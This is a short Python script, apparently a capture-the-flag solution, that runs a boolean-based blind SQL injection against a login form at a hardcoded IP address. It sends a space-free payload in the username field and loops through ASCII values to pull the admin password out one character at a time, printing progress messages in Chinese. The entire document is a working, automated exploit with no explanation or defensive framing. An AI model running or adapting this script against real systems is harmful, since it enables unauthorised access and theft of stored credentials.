import requests
def judge(index,guess):
    username="admin'&&ascii(mid((select(password)from(admin))from(index)))<>guess#"
    url='http://123.206.31.85:49167/index.php'
    rusername=username.replace('index',str(index)).replace('guess',str(guess))
    result=requests.post(url,data={'username':rusername,'password':'123456'}).text
    if 'password error!' in result:
        print('第'+str(index)+'个字符不是'+chr(guess))
        return 0
    print('第'+str(index)+'个字符是'+chr(guess))
    return 1

result=''
index=1
while 1:
    alpha=0
    
    for i in range(32,128):
        if judge(index,i):
            alpha=i
            result+=chr(i)
            break
    if alpha==0:
        print('爆破完成:'+result)
        break
    index+=1
